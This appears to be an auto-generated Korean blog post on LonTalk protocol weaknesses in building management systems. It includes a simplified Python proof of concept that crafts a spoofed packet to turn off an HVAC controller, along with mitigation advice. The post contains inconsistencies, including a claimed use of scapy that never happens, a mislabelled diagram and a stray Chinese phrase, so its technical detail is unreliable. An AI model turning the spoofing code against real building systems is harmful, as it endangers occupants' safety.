---
title: "🚨 LonTalk Protocol: BMS 환경 내 레거시 보안 취약점 분석"
date: 2026-04-19T08:06:08+09:00
draft: false
categories: ["보안"]
tags: ["보안"]
author: "Intelligence Agent"
---

## 서론

한겨울의 한복판, 빌딩 관리 시스템(BMS)이 알 수 없는 명령을 받아 난방을 끊고 냉방을 최대 출력으로 틀어버린다면 어떨까요? 혹은 화재 경보 시스템이 실제 화재 없이 미친 듯이 울려 대어 건물 전체를 공황 상태로 몰아넣는 시나리오를 상상해 보십시오. 이것은 영화 속 장면이 아닙니다. 현대의 스마트 빌딩과 공장에서 일어나고 있는 잠재적인 위협입니다.

최근 Claroty Team82가 발표한 연구에 따르면, 전 세계 수많은 빌딩 관리 시스템(BMS)에서 여전히 널리 사용되고 있는 레거시 통신 프로토콜 **LonTalk**이 심각한 보안 허점을 드러내고 있습니다. 1990년대 초반, '보안'이라는 개념이 오늘날처럼 중요하지 않던 시절에 설계된 LonTalk는 암호화나 인증 메커니즘이 결여된 채 운영되고 있습니다.

왜 이 주제가 지금 중요할까요? 최근 IT와 OT(Operational Technology)의 융합으로 인해 빌딩 자동화 시스템이 기업 네트워크에 연결되면서, 물리적 세계를 해킹하는 진입로로 레거시 프로토콜이 악용되고 있습니다. 우리는 단순히 오래된 기술을 교체하는 것을 넘어, 이러한 취약점이 어떻게 악용될 수 있는지 이해하고 현실적인 방어 전략을 세워야 합니다.

## 본론

### LonTalk의 기술적 배경과 보안 결함

LonTalk(Local Operating Network)은 Echelon 사가 개발한 프로토콜로, 주로 HVAC(난방, 환기, 공조), 조명, 엘리베이터 제어 등 건물 자동화 분야에서 사용됩니다. LonWorks 장치들은 흔히 'Neuron Chip'이라는 전용 칩을 사용하여 통신하며, OSI 7계층 모델을 모두 구현하는 독특한 구조를 가지고 있습니다.

그러나 문제는 바로 이 '디자인 원년'의 한계에서 옵니다. LonTalk 프로토콜은 기본적으로 평문(Cleartext) 통신을 하며, 패킷을 전송하는 주체를 검증하는 인증(Authentication) 절차가 없습니다. 이는 네트워크에 접근만 하면 누구나 명령을 위조하거나 재전송(Replay Attack)할 수 있음을 의미합니다. 보안 전문가 관점에서 이는 "Lock이 없는 문에 환기창만 달아둔 것"과 같습니다.

### 공격 시나리오: 네트워크 패킷 인젝션

공격자가 BMS 네트워크(주로 IP 기반의 i.LON 백본이나 트위스티드 페어 케이블)에 물리적이거나 논리적으로 침투했다고 가정해 봅시다. 공격자는 패킷 캡처 도구를 통해 LonTalk 패킷의 구조를 파악한 뒤, 악의적인 명령을 담은 패킷을 생성하여 네트워크에 주입할 수 있습니다.

아래는 공격자가 내부 네트워크를 장악하여 HVAC 시스템을 조작하는 흐름을 간단화한 다이어그램입니다.

```javascript
graph TD
    A[Attacker PC] --> B[Network Interface]
    B --> C[Packet Crafting Tool]
    C --> D[Mitigation / i.LON Router]
    D --> E[LonTalk Channel / TP-FT10]
    E --> F[Smart HVAC Controller]
    F --> G[VAV Boxes / Actuators]
    G --> H[Physical Environment]
```

이 공격 흐름에서 가장 취약한 지점은 LonTalk 채널(E)로 들어가는 지점입니다. 여기서는 어떠한 무결성 검사도 이루어지지 않습니다.

### 레거시 프로토콜 보안 비교

현대의 산업용 프로토콜과 LonTalk를 비교하면 왜 이 프로토콜이 위험한지 명확해집니다. 아래 표는 주요 프로토콜들의 보안 특성을 비교한 것입니다.

| 비교 항목 | LonTalk (Legacy) | BACnet/IP (Modern) | Modbus TCP (Legacy/Plugged) | | :--- | :--- | :--- | :--- | | **인증 (Authentication)** | 지원 안 함 (주소 기반 신뢰) | 부분 지원 (BACnet SC 등) | 지원 안 함 | | **암호화 (Encryption)** | 지원 안 함 (평문) | 선택적 암호화 가능 | 지원 안 함 (일반적) | | **무결성 (Integrity)** | 기본 CRC만 사용 (오류 탐지용) | 메시지 무결성 검증 가능 | CRC/Checksum | | **물리적 접근 요구** | 낮음 (IP 네트워크 연결 시) | 중간 | 낮음 | | **주요 위협** | 패킷 위조, 도청, 재전송 공격 | 인증 우회, DoS | 릴레이 제어, 데이터 변조 |

### 개념 증명(PoC) 코드 분석

**⚠️ 경고**: 아래 코드는 오직 교육 및 방어 목적(Defensive Security)을 위해 작성되었습니다. 승인되지 않은 시스템에서 실행하는 것은 불법입니다.

LonTalk 패킷은 기본적으로 헤더와 데이터로 구성됩니다. Python의 `scapy` 라이브러리를 사용하여 악의적인 패킷을 생성하는 시뮬레이션 코드를 작성해 보겠습니다. 이 코드는 네트워크 상의 HVAC 제어기에 "긴급 정지(Emergency Stop)" 신호를 보내는 시나리오를 가정합니다.

```python
import struct
import socket

# LonTalk Protocol Simulation (Simplified for educational purpose)
# 실제 LonTalk 패킷 구조는 훨씬 복잡하며, Neuron Chip의 TP/FT-10 프레임 포맷을 따릅니다.

def create_malicious_lontalk_packet(src_addr, dest_addr, command_code, data):
    """
    악의적인 LonTalk 패킷 생성 시뮬레이션
    :param src_addr: 공자자 노드 주소 (위조 가능)
    :param dest_addr: 타겟 HVAC 컨트롤러 주소
    :param command_code: 제어 명령 (예: 0x78 - Write Property)
    :param data: 전송할 데이터 (예: 온도 설정값)
    """
    # 가상의 헤더 포맷: [Ver][Src][Dest][Cmd][Length][Data][CRC]
    # 실제 환경에서는 비트 단위 패킹이 필요합니다.
    header = struct.pack(
        '<BBHBB', 
        0x01,           # Version
        src_addr,       # Source Node ID
        dest_addr,      # Destination Node ID
        command_code,   # Command (e.g., Network Variable Update)
        len(data)       # Data Length
    )
    
    payload = header + data.encode('utf-8')
    
    # CRC 계산 (단순화된 예시)
    crc = sum(payload) & 0xFF
    packet = payload + struct.pack('B', crc)
    
    return packet

def send_packet_udp(packet, ip, port):
    """
    LonTalk over IP (i.LON) 통신 시뮬레이션
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(packet, (ip, port))
    print(f"[+] Packet sent to {ip}:{port}")
    sock.close()

# Attack Scenario: Forcing HVAC to OFF state
# 주의: 실제 주소와 포트는 환경에 따라 다릅니다.
target_ip = "192.168.10.10"  # i.LON Gateway IP
target_port = 1628           # Standard UDP port for LonTalk over IP

# 악성 페이로드: "HVAC_MODE=OFF"
malicious_payload = "HVAC_MODE=OFF"
crafted_packet = create_malicious_lontalk_packet(
    src_addr=0x05,    # 위조된 관리자 주소
    dest_addr=0x02,   # 타겟 HVAC 컨트롤러
    command_code=0x78,# 네트워크 변수 쓰기 명령
    data=malicious_payload
)

# 실제 공격 수행 (주석 처리됨)
# send_packet_udp(crafted_packet, target_ip, target_port)
print("[PoC] Malicious packet crafted successfully. Ready for analysis.")
```

이 코드가 보여주는 핵심은 공격자가 `src_addr`를 위조하여 마치 정상적인 관리자 명령인 것처럼 가장할 수 있다는 점입니다. 수신 측 HVAC 컨트롤러는 이 명령을 검증할 절차가 없기 때문에 즉시 가동을 멈추게 됩니다.

### 단계별 방어 및 완화 전략

레거시 장비를 모두 최신 제품으로 교체하는 것은 비용과 시간 면에서 현실적으로 불가능한 경우가 많습니다. 따라서 **심층 방어(Defense in Depth)** 접근법이 필요합니다.

1.  **네트워크 분리 (Segmentation)**     *   BMS 네트워크를 기업 IT 네트워크로부터 물리적 또는 논리적으로(VLAN) 분리해야 합니다.     *   LonTalk 세그먼트와 IP 백본 사이에 방화벽이나 IDS(침입 탐지 시스템)를 배치하여 비정상적인 트래픽을 필터링합니다.

2.  **프로토콜 게이트웨이 및 프록시 도입**     *   레거시 LonTalk 프로토콜을 현대적인 안전한 프로토콜(MQTT TLS 등)로 변환해주는 게이트웨이를 배치합니다.     *   게이트웨이에서 엄격한 인증을 수행하여, 내부 LonTalk 버스에는 신뢰할 수 있는 명령만 전달되도록 합니다.

3.  **패시브 모니터링 및 행동 분석**     *   Mirroring된 포트를 통해 LonTalk 트래픽을 깊이 패킷 검사(DPI)합니다.     *   평소와 다른 패턴(예: 업무 시간 외의 대량 제어 명령, 비정상적 노드 간 통신)을 감지하고 관리자에게 알립니다.

4.  **물리적 접근 통제**     *   LonTalk 케이블이 연결된 배선반과 제어반에 대한 물리적 잠금 장치를 강화합니다. 많은 BMS 해킹이 내부자의 물리적 접근으로 시작됩니다.

## 결론

Claroty Team82가 경고한 LonTalk 프로토콜의 취약점은 단순히 오래된 기술의 문제가 아닙니다. 이는 **보안 없는 편리함이 불러올 수 있는 물리적 재앙**을 보여주는典型案例입니다. 우리는 난방이 꺼지거나 조명이 마비되는 불편함을 넘어, 건물 거주자의 안전과 기업의 연속성이 위협받을 수 있다는 사실을 직시해야 합니다.

보안 전문가로서의 제 인사이트는 다음과 같습니다. "보안은 장비를 구매할 때가 아니라, 설계할 때 고려되어야 합니다." 하지만 이미 설계가 끝난 레거시 시스템을 운영해야 하는 현실이라면, **"신뢰할 수 있는 경계(Trusted Boundary)"를 만드는 데 집중**하십시오. 레거시 프로토콜 자체를 수정할 수는 없더라도, 그 프로토콜이 살아있는 네트워크 환경을 격리하고 모니터링함으로써 위험을 관리할 수 있습니다.

이제 관리자는 자신의 관할 하에 있는 빌딩 자동화 시스템이 어떤 프로토콜을 사용하는지, 그리고 그 프로토콜이 보안을 제공하는지 확인해야 할 때입니다.

## 참고자료
- [Claroty Team82 Research on LonTalk Vulnerabilities](https://claroty.com/team82)
- [LonWorks Protocol Specification](https://www.echelon.com)
- [NIST Guide to Industrial Control Systems (ICS) Security](https://csrc.nist.gov/publications/detail/sp/800-82/final)

---

**출처**: [https://news.google.com/rss/articles/CBMi4AFBVV95cUxPdEhZRkp2ZU1WNTBYYmhiN3RkbWcwRWxXUl9tZzRDMFUxMHV1TEJ1aXN5SUEzTWZpc0VxcEwyZzNuZ0hZdDJta19DSk53RE1fVDdqbUcweVk1djl0VXBRNHdxQlpoUVVGTUdJRThnenZtTlVqaWR0MEl2TTBpZm9LZlp0ZUdTX0tNa3djU0NYc0ZKbXZ0Snl5QTl6Qnp2TzBuX0l5QUkwSmVyLVEtUFNXOE4xUlhqSmF0MWpfSW0zYl92RjZwZ0FQcVJNY0twN1I0SW1xa0lxY0xMMGZUTGh1Rg?oc=5](https://news.google.com/rss/articles/CBMi4AFBVV95cUxPdEhZRkp2ZU1WNTBYYmhiN3RkbWcwRWxXUl9tZzRDMFUxMHV1TEJ1aXN5SUEzTWZpc0VxcEwyZzNuZ0hZdDJta19DSk53RE1fVDdqbUcweVk1djl0VXBRNHdxQlpoUVVGTUdJRThnenZtTlVqaWR0MEl2TTBpZm9LZlp0ZUdTX0tNa3djU0NYc0ZKbXZ0Snl5QTl6Qnp2TzBuX0l5QUkwSmVyLVEtUFNXOE4xUlhqSmF0MWpfSW0zYl92RjZwZ0FQcVJNY0twN1I0SW1xa0lxY0xMMGZUTGh1Rg?oc=5)